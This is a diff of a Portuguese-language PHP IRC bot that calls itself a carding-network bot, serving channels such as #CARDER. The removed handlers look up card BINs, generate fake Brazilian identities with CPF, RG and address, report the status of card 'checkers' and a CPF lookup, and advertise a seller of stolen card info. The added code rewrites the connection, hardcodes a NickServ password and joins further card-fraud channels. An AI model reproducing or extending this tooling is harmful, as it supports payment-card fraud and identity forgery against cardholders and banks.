-				}
-			        break;
-			    case part:
-				$toPart = preg_replace('/\s+/', '', $ex[4]);
-				if(isset($ex[4]) && $ex[4] != "") {
-					fputs($socket, "PART $toPart \n");
-				}
-			        break;
-			    case ip:
-				$meuIP = pegaIp();
-				fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [IP] $meuIP \n");
-			        break;
-			    }
-			} else { fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] 04✘404 - 05VOCÊ NÃO POSSUI ESTA PERMISSÃO !\n"); }
-		}
-		// AUTOVOICE PARA MEMBROS NO #CARDER
-		if($ex[1] == "JOIN" && isset($ex[2]) && strpos(strtoupper($ex[2]), '#CARDER')){
-			$nicktmp = explode('!', $ex[0]);
-			$hosttmp = explode('@', $nicktmp[1]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			$chantmp = str_replace(":#", "", $ex[2]);
-			$chanCMD = preg_replace('/\s+/', '', $chantmp);
-			$identdtmp = $hosttmp[0];
-			VerificaCliente($nickCMD, $identdtmp, $hosttmp[1]);
-		}
-		// AUTOVOICE @ #CARDER
-		if($ex[1] == "JOIN" && isset($ex[2]) && $autovoice){
-			$nicktmp = explode('!', $ex[0]);
-			$hosttmp = explode('@', $nicktmp[1]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			$chantmp = str_replace(":#", "", $ex[2]);
-			$chanCMD = preg_replace('/\s+/', '', $chantmp);
-			if (strtoupper($chanCMD) == "CARDER" && $nickCMD != "Norah_C_IV" && $nickCMD != "j4ckass" && $nickCMD != "GENEILTON01") {
-				fputs($socket, "MODE #CARDER +v ".$nickCMD."\n");
-			}
-		}
-		// AUTOBAN JOIN (Guest & AndroUser)
-		if($ex[1] == "JOIN" && isset($ex[2]) && $nickGuestJOIN){
-			$nicktmp = explode('!', $ex[0]);
-			$hosttmp = explode('@', $nicktmp[1]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			$chantmp = str_replace(":#", "", $ex[2]);
-			$chanCMD = preg_replace('/\s+/', '', $chantmp);
-			$eGuest = substr($nickCMD, 0, 5);
-			$eAndroUser = substr($nickCMD, 0, 9);
-			if (strtoupper($chanCMD) == "CARDER") {
-				if ($eGuest == "Guest") {
-					fputs($socket, "KICK #CARDER ".$nickCMD." :Nick Guest não permitido!\n");
-					fputs($socket, "MODE #CARDER +b ~t:60:*!*@".$hosttmp[1]."\n");
-
-				}
-				if ($eAndroUser == "AndroUser") {
-					fputs($socket, "KICK #CARDER ".$nickCMD." :Nick AndroUser não permitido!\n");
-					fputs($socket, "MODE #CARDER +b ~t:60:*!*@".$hosttmp[1]."\n");
-				}
-			}
-		}
-		// AUTOBAN NICKCHANGE (Guest & AndroUser)
-		if(isset($ex[0]) && $ex[1] == "NICK"  && $nickGuestCHANGE) {
-			$nicktmp = explode('!', $ex[0]);
-			$hosttmp = explode('@', $nicktmp[1]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			$newnick = str_replace(":", "", $ex[2]);
-			$eGuest = substr($newnick, 0, 5);
-			$eAndroUser = substr($newnick, 0, 9);
-			if ($eGuest == "Guest") {
-				fputs($socket, "KICK #CARDER ".$newnick." :Nick Guest não permitido!\n");
-			} elseif ($eAndroUser == "AndroUser") {
-				fputs($socket, "KICK #CARDER ".$newnick." :Nick AndroUser não permitido!\n");
-			}
-		}
-		// COMANDOS #BRAZIL
-		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#BRAZIL"){
-			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
-			$nicktmp = explode('!', $ex[0]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			switch ($comando) {
-			    case 'sro':
-				$codRastreio = preg_replace('/\s+/', '', $ex[4]);
-				if (isset($ex[4]) && strlen($codRastreio) == 13) {
-					$codObjeto = rastreioEncomenda($ex[4]);
-					$sroACAO = $codObjeto[0]['acao'];
-					$sroDATA = $codObjeto[0]['dia']." - ".$codObjeto[0]['hora'];
-					$sroLOCAL = $codObjeto[0]['local'];
-                                        fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → [RASTREIO] ".preg_replace('/\s+/', '', $ex[4])." [STATUS] $sroACAO [LOCAL] $sroLOCAL [DATA/HORA] $sroDATA \n");
-                                } else { fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → Insira o CODIGO DE RASTREIO PARA CONSULTA02 ( Exemplo: !sro PT113178279BR )\n"); }
-                                break;
-			}
-		}
-		// COMANDOS #PAYMENT
-		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#PAYMENT"){
-			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
-			$nicktmp = explode('!', $ex[0]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			switch ($comando) {
-			    case tempmail:
-				$tempMAIL = geraTempMail();
-				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] [7temp-mail1.7org1]12 $tempMAIL \n");
-			        break;
-			    case dados:
-				$dados = json_decode(GeraPessoa());
-			        fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
-			        break;
-			    case lookup:
-				if ($comando == "lookup") {
-				if (isset($ex[4]) && strlen($ex[4]) >= 7) {
-					$lookup = IPlookup(preg_replace('/\s+/', '', $ex[4]));
-					$reverseDNS = limpaString(getStr($lookup,'<th>Reverse DNS:</th>','</td>'));
-					$country = getStr($lookup, 'Country:</th><td> ', ' &nbsp;&nbsp;');
-					$state = str_replace("<td class='tracking'>", '', str_replace("<td class='tracking lessimpt'>", '', getStr($lookup, 'State:</th>', '</td>')));
-					$city = str_replace('<td> ', '', str_replace("<td class='vazno'>", '', getStr($lookup, 'City Location:</th>', '</td>')));
-					$isp = getStr($lookup, 'ISP:</th><td>', '</td>');
-					$asnumber = getStr($lookup, 'AS Number:</th><td>', '</td>');
-					$iphostname = str_replace("<td class='tracking'>", '', getStr($lookup, 'Hostname:</th> ', '</td><'));
-                                        fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
-                                } else { fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → 05Insira o IP para consulta 01( Exemplo: !lookup 8.8.8.8 )\n"); } }
-                                break;
-			}
-		}
-		// COMANDOS #BRONX
-		// :JBiLTDA!t7DS@jbiltda.kiprest.com.br PRIVMSG #BRONX :!dados
-		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && isset($ex[2])){
-			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
-			$nicktmp = explode('!', $ex[0]);
-			$hosttmp = explode('@', $nicktmp[1]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			switch ($comando) {
-			    case 'vendas':
-				fputs($socket, "NOTICE $nickCMD :VENDEDOR DE INFOCC →02 [BOLSONARO71]03✔ VERIFICADO  - 12TABELA [https://pastecode.xyz/view/raw/c990cecb]\n");
-			        break;
-			}
-		}
-		// COMANDOS #BRONX
-		// :JBiLTDA!t7DS@jbiltda.kiprest.com.br PRIVMSG #BRONX :!dados
-		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#CARDER"){
-			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
-			$nicktmp = explode('!', $ex[0]);
-			$hosttmp = explode('@', $nicktmp[1]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			switch ($comando) {
-			    case 'comandos':
-				fputs($socket, "PRIVMSG $ex[2] :COMANDOS DO BOT CHECKNET OF [07#CARDER] => [13https://pastebin.pl/view/raw/140f8d1b]\n");
-			        break;
-			    case 'regras':
-				fputs($socket, "PRIVMSG $ex[2] :REGRAS DO CANAL [07#CARDER] => [13 AINDA NÃO POSSUI REGRAS !]\n");
-			        break;
-			    case 'ajuda':
-				fputs($socket, "PRIVMSG $ex[2] :AJUDA & PERMISSÕES DO CANAL [07#CARDER] => [13 AINDA NÃO POSSUI PERMISSOES PREVIAS !]\n");
-			        break;
-			    case 'tempmail':
-				$tempMAIL = geraTempMail();
-				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] [7temp-mail1.7org1]12 $tempMAIL \n");
-			        break;
-			    case 'status':
-				if($checkerGGBB) { $statusGGBB = "03✔ ATIVO"; } else { $statusGGBB = "05✘ DESATIVADO05"; }
-				if($checkerGGELO) { $statusGGELO = "03✔ ATIVO"; } else { $statusGGELO = "05✘ DESATIVADO05"; }
-				if($checkerFULL) { $statusFULL = "03✔ ATIVO"; } else { $statusFULL = "05✘ DESATIVADO05"; }
-				if($consultaCADSUS) { $statusconsulta = "03✔ ATIVO"; } else { $statusconsulta = "05✘ DESATIVADO05"; }
-				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] GG-BB [$statusGGBB] GG-ELO [$statusGGELO] CHK-FULL [$statusFULL] CONSULTA NOME/CPF/CNS [$statusconsulta] \n");
-			        break;
-			    case 'bin':
-				if (isset($ex[4]) && strlen(preg_replace('/\s+/', '', $ex[4])) >= 6) {
-					$tempBIN = substr($ex[4], 0, 6);
-					$dadosBIN = pegaBin($tempBIN);
-					$jsonSCHEME = $dadosBIN[7];
-					$jsonNAME = convertCountry($dadosBIN[6]);
-					$jsonTYPE = $dadosBIN[8];
-					$jsonBRAND = $dadosBIN[9];
-					$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-					fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [BIN]02 $tempBIN [BANDEIRA]02 $jsonSCHEME [PAÍS]02 $jsonNAME [BANCO]02 $binBANCO [TIPO]02 $jsonTYPE [CATEGORIA]02 $jsonBRAND \n");
-				} elseif (strlen($ex[4]) < 6) {
-					fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [ERRO] 05Bin deve conter 6 numeros. 02( Exemplo: !bin 552289 )\n");
-				} else {
-					fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [ERRO] 05Bin deve conter 6 numeros. 02( Exemplo: !bin 552289 )\n");
-				}
-			        break;
-			    case 'ip':
-				$meuIP = pegaIp();
-				fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [IP] $meuIP \n");
-			        break;
-			    case 'version':
-			        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → 07CheckNet BOT OF CARDING NETWORK [VERSÃO] $version (VERSÃO DE TESTE) ATUALIZADO DIA: [$release]\n");
-			        break;
-			    case 'dados':
-				$dados = json_decode(GeraPessoa());
-			        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
-			        break;
-			    case 'uname':
-                                if($nickCMD == $master) {
-                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [SHELL] $CPUdistro \n");
-                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] 04404 - 01 USUARIO NÃO RECONHECIDO PELO BOT! 11[TENTE NOVAMENTE] \n"); }
-                                break;
-			    case 'uptime':
-                                if($nickCMD == $master) {
-					$SYSuptime = Uptime();
-                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [UPTIME] $SYSuptime \n");
-                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] 04404 - 01 USUARIO NÃO RECONHECIDO PELO BOT! 11[TENTE NOVAMENTE] \n"); }
-                                break;
-			    case 'lookup':
-				if ($comando == "lookup") {
-				if (isset($ex[4]) && strlen($ex[4]) >= 7) {
-					$lookup = IPlookup(preg_replace('/\s+/', '', $ex[4]));
-					$reverseDNS = limpaString(getStr($lookup,'<th>Reverse DNS:</th>','</td>'));
-					$country = getStr($lookup, 'Country:</th><td> ', ' &nbsp;&nbsp;');
-					$state = str_replace("<td class='tracking'>", '', str_replace("<td class='tracking lessimpt'>", '', getStr($lookup, 'State:</th>', '</td>')));
-					$city = str_replace('<td> ', '', str_replace("<td class='vazno'>", '', getStr($lookup, 'City Location:</th>', '</td>')));
-					$isp = getStr($lookup, 'ISP:</th><td>', '</td>');
-					$asnumber = getStr($lookup, 'AS Number:</th><td>', '</td>');
-					$iphostname = str_replace("<td class='tracking'>", '', getStr($lookup, 'Hostname:</th> ', '</td><'));
-                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
-                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → 05Insira o IP para consulta 01( Exemplo: !lookup 8.8.8.8 )\n"); } }
-                                break;
-			    case 'sro':
-				$codRastreio = preg_replace('/\s+/', '', $ex[4]);
-				if (isset($ex[4]) && strlen($codRastreio) == 13) {
-					$codObjeto = rastreioEncomenda($ex[4]);
-					$sroACAO = $codObjeto[0]['acao'];
-					$sroDATA = $codObjeto[0]['dia']." - ".$codObjeto[0]['hora'];
-					$sroLOCAL = $codObjeto[0]['local'];
-                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [RASTREIO] ".preg_replace('/\s+/', '', $ex[4])." [STATUS] $sroACAO [LOCAL] $sroLOCAL [DATA/HORA] $sroDATA \n");
-                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → Insira o CODIGO DE RASTREIO PARA CONSULTA 02( Exemplo: !sro PT113178279BR )\n"); }
-                                break;
-			}
-		}
+// ADICIONANDO TRATAMENTO DE ERRO P/CONEXAO MAL SUCEDIDA 
+	if ( $socket === false ) {
+		$errorCode = socket_last_error();
+		$errorString = socket_strerror( $errorCode );
+		die( "Error $errorCode: $errorString\n" );
 	}
-}
+
+// ENVIANDO INFORMAÇÕES DE REGISTRO PARA A REDE
+	socket_write( $socket, "NICK $nickname\r\n");
+	socket_write( $socket, "USER $ident * 8 :$gecos\r\n" );
+
+// FINAL DO LOOP
+	// BUSCANDO DADOS DO SOCKET
+	$data = trim( socket_read( $socket, 1024, PHP_NORMAL_READ ) );
+	echo $data . "\n";
+	// DIVIDINDO OS DADOS EM PEDAÇOS
+	$ex = explode(' ', $data);
+	// PREENCHIMENTO DO ARRAY PARA EVITAR ERROS
+	$ex = array_pad( $ex, 10, '' );
+
+// MANIPULADOR DE PING
+    // PING : IRC.CHKNET.CC
+    if ( $ex[0] === 'PING') {
+    	socket_write( $socket, 'PONG ' . $ex[1] . "\r\n" );
+    }
+    if($ex[0] == ":NickServ!services@services.chknet" && $ex[4] == "accepted") {
+       socket_write( $socket, "PRIVMSG NickServ :identify norah235144\r\n" );
+       socket_write( $socket, 'JOIN ' . $channel . "\r\n" );
+       socket_write( $socket, "JOIN #BRAZIL\n");
+       socket_write( $socket, "JOIN #UNIX\n");
+       socket_write( $socket, "JOIN #CCPOWER\n");
+       socket_write( $socket, "JOIN #alternative\n");
+       socket_write( $socket, "JOIN #check\n");
+       socket_write( $socket, "JOIN #cctools\n");
+       socket_write( $socket, "JOIN #jcheck\n");
+    }
+
+
+// SEPARAÇÃO DE NICK - IDENT - HOSTNAME [CheckNet~!CheckNet@CardingBotNetwork]
+ if($ex[1] == "PRIVMSG" && $ex[2] == $nickname){
+			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
+			$nicktmp = explode('!', $ex[0]);
+			$nickCMD = str_replace(":", "", $nicktmp[0]);
+			$hosttmp = explode('@', $nicktmp[1]);
+			$identdtmp = $hosttmp[0];
+ }
+ //    [0]                        [1]        [2]        [3]
+ // :Nickname!ident@hostname    PRIVMSG   #CHANNEL   :!comand  
+ if ( $ex[3] == '!comandos') {
+ 	$resposta = "10[_$nickCMD_] →01 COMANDOS DA SALA AQUI 07[ https://pastebin.pl/view/raw/140f8d1b ] ";
+ 	socket_write( $socket, 'PRIVMSG' . $ex[2] . " :$resposta\r\n" );
+ }
+ 
 ?>
